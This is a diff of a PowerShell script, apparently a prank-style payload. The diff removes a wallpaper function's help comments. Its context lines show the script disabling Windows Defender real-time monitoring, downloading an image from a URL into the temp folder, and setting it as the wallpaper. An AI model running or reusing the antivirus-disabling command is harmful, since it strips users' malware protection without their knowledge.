@@ -15,24 +15,6 @@ Set-MpPreference -DisableRealtimeMonitoring $true
 
 Function Set-WallPaper {
  
-<#
- 
-    .SYNOPSIS
-    Applies a specified wallpaper to the current user's desktop
-    
-    .PARAMETER Image
-    Provide the exact path to the image
- 
-    .PARAMETER Style
-    Provide wallpaper style (Example: Fill, Fit, Stretch, Tile, Center, or Span)
-  
-    .EXAMPLE
-    Set-WallPaper -Image "C:\Wallpaper\Default.jpg"
-    Set-WallPaper -Image "C:\Wallpaper\Background.jpg" -Style Fit
-  
-#>
-
- 
 param (
     [parameter(Mandatory=$True)]
     # Provide path to image
@@ -95,6 +77,7 @@ Invoke-WebRequest -Uri $image -OutFile $env:TMP\i.png
 Set-WallPaper -Image "$env:TMP\i.png" -Style Center
 
 exit
+
 
 
 
